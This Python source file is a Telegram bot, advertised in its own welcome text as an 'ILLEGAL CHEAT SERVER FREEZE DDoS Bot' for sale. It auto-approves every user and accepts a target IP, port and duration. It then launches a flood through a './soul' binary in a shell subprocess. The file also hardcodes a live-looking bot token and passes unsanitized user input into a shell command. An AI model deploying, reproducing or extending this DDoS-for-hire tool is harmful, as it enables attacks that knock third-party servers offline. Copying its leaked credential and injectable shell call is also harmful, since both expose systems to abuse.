import os
import telebot
import logging
import asyncio
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.new_event_loop()

TOKEN = "7722715217:AAEaDInqxwIBg7DGMOQb77gudQHbfrsqqgw"
FORWARD_CHANNEL_ID = -1002220400423

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0


@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else "Not set"
    first_name = message.from_user.first_name if message.from_user.first_name else "Not set"
    last_name = message.from_user.last_name if message.from_user.last_name else ""

    full_name = f"{first_name} {last_name}".strip()
    status = "Approved"  # Automatically approve all users

    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_photo = profile_photos.photos[0][-1].file_id
    else:
        profile_photo = None

    welcome_message = f"""
    Welcome to ILLEGAL CHEAT SERVER FREEZE DDoS Bot!
 DM TO BUY    @ILLEGALCHEAT78

    Your Information:
    Name: {full_name}
    Username: @{username}
    ID Number: {user_id}
    Status: {status}
    
    Commands:
    /attack - Launch an attack (use: IP Port Time)
    /when - Check remaining attack time
    """

    if profile_photo:
        bot.send_photo(message.chat.id, profile_photo, caption=welcome_message)
    else:
        bot.reply_to(message, welcome_message)


@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    if bot.attack_in_progress:
        bot.send_message(message.chat.id, "⚠️ Please wait! The bot is currently busy with another attack.")
        return

    bot.send_message(message.chat.id, "💣 Ready to launch an attack?\n"
                                      "Send the target IP, port, and duration in seconds.\n"
                                      "Example: `167.67.25 6296 180` 🔥", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "❗ Error! Please provide the IP, port, and duration correctly.", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🔒 Port {target_port} is blocked.", parse_mode='Markdown')
            return
        if duration > 180:
            bot.send_message(message.chat.id, "⏳ Maximum duration is 180 seconds.", parse_mode='Markdown')
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = loop.time()

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"🚀 Attack Launched!\n"
                                          f"Target Host: {target_ip}\n"
                                          f"Target Port: {target_port}\n"
                                          f"Duration: {duration} seconds!", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.attack_in_progress = False


async def run_attack_command_async(target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./soul {target_ip} {target_port} {duration} 900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()
        logging.info(f"Attack Output: {stdout.decode()}")
        if stderr:
            logging.error(f"Attack Error: {stderr.decode()}")
    except Exception as e:
        logging.error(f"Error during attack execution: {e}")
    finally:
        bot.attack_in_progress = False


@bot.message_handler(commands=['when'])
def handle_when_command(message):
    if not bot.attack_in_progress:
        bot.send_message(message.chat.id, "There is no active attack right now.")
    else:
        elapsed_time = loop.time() - bot.attack_start_time
        remaining_time = max(0, bot.attack_duration - elapsed_time)
        bot.send_message(message.chat.id, f"Time remaining for the current attack: {int(remaining_time)} seconds.")


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()


if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()